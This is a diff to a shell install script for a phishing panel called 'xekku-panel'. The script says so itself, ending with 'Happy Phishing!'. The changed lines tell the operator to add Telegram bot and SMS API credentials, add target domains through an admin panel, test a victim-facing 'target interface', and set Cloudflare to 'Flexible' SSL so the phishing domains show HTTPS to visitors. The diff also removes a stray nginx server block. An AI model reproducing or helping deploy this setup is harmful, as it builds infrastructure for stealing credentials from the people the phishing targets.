@@ -274,33 +274,6 @@ EOF
 # Remove old config and enable new one
 rm -f /etc/nginx/sites-enabled/*
 ln -s /etc/nginx/sites-available/xekku-panel /etc/nginx/sites-enabled/
-    server_name $DOMAIN_NAME;
-
-    # SSL configuration
-    ssl_certificate /etc/letsencrypt/live/$DOMAIN_NAME/fullchain.pem;
-    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN_NAME/privkey.pem;
-    include /etc/letsencrypt/options-ssl-nginx.conf;
-    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;
-
-    location / {
-        proxy_pass http://localhost:3000;
-        proxy_http_version 1.1;
-        proxy_set_header Upgrade \$http_upgrade;
-        proxy_set_header Connection 'upgrade';
-        proxy_set_header Host \$host;
-        proxy_cache_bypass \$http_upgrade;
-    }
-
-    location /socket.io/ {
-        proxy_pass http://localhost:3001;
-        proxy_http_version 1.1;
-        proxy_set_header Upgrade \$http_upgrade;
-        proxy_set_header Connection "upgrade";
-        proxy_set_header Host \$host;
-        proxy_cache_bypass \$http_upgrade;
-    }
-}
-EOF
 
 # --- Start Application with PM2 ---
 echo "--- Starting the application with PM2... ---"
@@ -438,7 +411,8 @@ echo "⚙️  NEXT STEPS:"
 echo "   1. Update Telegram bot token in .env file"
 echo "   2. Configure SMS API credentials in .env file"
 echo "   3. Add domains via admin panel"
-echo "   4. Test target interface: http://any-domain/?id=dXNlcg=="
+echo "   4. CONFIGURE CLOUDFLARE SSL (see below)"
+echo "   5. Test target interface: http://any-domain/?id=dXNlcg=="
 echo ""
 echo "🎯 TESTING:"
 echo "   Test main domain: curl -I https://$DOMAIN_NAME"
@@ -449,6 +423,40 @@ echo "📞 TROUBLESHOOTING:"
 echo "   Check Nginx:     nginx -t && systemctl status nginx"
 echo "   Check PM2:       pm2 status && pm2 logs"
 echo "   Check database:  sudo -u postgres psql -d $DB_NAME -c '\\dt'"
+echo ""
+echo "🌐 CLOUDFLARE SSL CONFIGURATION (CRITICAL FOR CONNECTED DOMAINS):"
+echo "==================================================================="
+echo ""
+echo "⚠️  IMPORTANT: If you get 'Error 526 - Invalid SSL Certificate' on connected domains:"
+echo ""
+echo "🔧 FOR EACH CONNECTED DOMAIN (e.g., stephenhawkinswheelchair.fun):"
+echo "   1. Login to Cloudflare Dashboard"
+echo "   2. Select your connected domain"
+echo "   3. Go to: SSL/TLS → Overview"
+echo "   4. Set SSL mode to: 'Flexible' (NOT Full or Strict)"
+echo "   5. Wait 2-3 minutes for changes to propagate"
+echo ""
+echo "🔐 SSL MODE EXPLANATION:"
+echo "   • Main Domain ($DOMAIN_NAME): Full/Strict (has SSL certificate)"
+echo "   • Connected Domains: Flexible (no SSL certificate needed)"
+echo ""
+echo "💡 WHY FLEXIBLE MODE:"
+echo "   Visitor → [HTTPS] → Cloudflare → [HTTP] → Your Server"
+echo "   - Visitor sees secure HTTPS"
+echo "   - Cloudflare handles SSL encryption"
+echo "   - Your server serves HTTP (no certificate needed)"
+echo "   - Perfect for target domains!"
+echo ""
+echo "✅ EXPECTED RESULTS AFTER CLOUDFLARE CONFIG:"
+echo "   Main Domain:     https://$DOMAIN_NAME/admin/login"
+echo "   Connected Domain: http://any-domain/?id=dXNlcg=="
+echo "   Socket.io:       Works on both domains"
+echo ""
+echo "🚨 COMMON CLOUDFLARE ERRORS & FIXES:"
+echo "   Error 526: Set SSL mode to 'Flexible'"
+echo "   Error 521: Check if PM2 services are running"
+echo "   Error 522: Check firewall allows ports 80,443,3000,3001"
+echo ""
 echo ""
 echo "==================================="
 echo "    Happy Phishing! 🎣              "
